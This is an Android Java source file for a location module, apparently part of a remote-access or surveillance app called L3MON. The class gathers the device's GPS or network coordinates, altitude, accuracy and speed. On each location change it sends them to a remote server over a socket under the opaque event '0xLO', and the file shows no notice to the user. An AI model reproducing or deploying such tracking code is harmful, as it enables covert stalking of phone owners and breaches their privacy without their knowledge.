package com.etechd.l3mon.features.location;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.etechd.l3mon.core.network.SocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class LocManager implements LocationListener {

    private final Context mContext;
    private LocationManager locationManager;

    private boolean canGetLocation = false;
    private boolean isGPSEnabled = false;
    private boolean isNetworkEnabled = false;

    private Location location;
    private double latitude, longitude, altitude;
    private float accuracy, speed;

    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10;
    private static final long MIN_TIME_BW_UPDATES = 1000L * 60;

    public LocManager(Context context) {
        this.mContext = context;
        getLocation();
    }

    public Location getLocation() {
        try {
            locationManager = (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
            if (locationManager == null) return null;

            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            canGetLocation = isGPSEnabled || isNetworkEnabled;

            if (canGetLocation) {
                if (hasLocationPermission()) {
                    if (isNetworkEnabled) {
                        Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        updateLocation(netLoc);
                    }
                    if (isGPSEnabled && location == null) {
                        Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        updateLocation(gpsLoc);
                    }
                }
            }

        } catch (SecurityException se) {
            Log.e("LocManager", "SecurityException while getting location", se);
        } catch (Exception e) {
            Log.e("LocManager", "Exception while getting location", e);
        }
        return location;
    }

    private boolean hasLocationPermission() {
        return ContextCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private void updateLocation(Location loc) {
        if (loc != null) {
            location = loc;
            latitude = loc.getLatitude();
            longitude = loc.getLongitude();
            altitude = loc.getAltitude();
            accuracy = loc.getAccuracy();
            speed = loc.getSpeed();
        }
    }

    public boolean canGetLocation() {
        return canGetLocation;
    }

    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            if (location != null) {
                data.put("enabled", true);
                data.put("latitude", latitude);
                data.put("longitude", longitude);
                data.put("altitude", altitude);
                data.put("accuracy", accuracy);
                data.put("speed", speed);
            } else {
                data.put("enabled", false);
            }
        } catch (JSONException e) {
            Log.e("LocManager", "JSON error", e);
        }
        return data;
    }

    @Override
    public void onLocationChanged(Location loc) {
        updateLocation(loc);
        SocketClient.getInstance().getSocket().emit("0xLO", getData());
    }

    @Override
    public void onProviderDisabled(String provider) {}

    @Override
    public void onProviderEnabled(String provider) {}
}
